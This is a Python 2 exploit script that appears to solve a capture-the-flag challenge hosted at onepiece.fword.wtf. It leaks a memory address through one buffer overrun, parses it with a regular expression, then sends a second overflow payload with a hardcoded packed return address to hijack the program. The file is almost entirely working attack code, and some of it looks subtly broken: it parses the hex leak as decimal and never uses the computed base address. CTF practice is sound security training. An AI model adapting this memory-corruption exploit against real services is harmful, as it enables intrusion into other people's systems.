#!/usr/bin/python2

import sys
import struct
import socket
import re

local = False

challange_ip = 'onepiece.fword.wtf'
challange_port = 1238

def search_for_address(data):
    try:
        return re.search(r'.*Luffy is amazing.*\s([a-f0-9]+)($|\s*)', data).groups()[0]
    except:
        return None

class PWNCon:
    def __init__(self, local = False):
        self.local = local
        if not self.local:
            self.op = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.op.connect((challange_ip, challange_port))

            self.op_read = self.op.makefile()

    def write(self, data):
        if not self.local:
            self.op.sendall(data)
        else:
            sys.stdout.write(data)

    def readline(self):
        if not self.local:
            return self.op_read.readline()
        else:
            return 'MOCK READ'

sys_exit = 0x0000555555554780

io_buffer_overrun = 'A' * 0x27 + 'z'
ret = struct.pack('<Q', sys_exit)
io_local_buffer_overrun = ('A' * 0x30) + ret + ret + '\n'

op = PWNCon(local)

print(op.readline())
op.write('read\n')
op.write(io_buffer_overrun)
op.write('gomugomunomi\n')

address = None
while not address:
    address = search_for_address(op.readline())

sys.stderr.write('Got address: {}'.format(address))
address = int(address) & 0xfffffff000 # binary base address

op.write(io_local_buffer_overrun)

if op.local:
    exit(0)

while 1:
    print(op.readline())

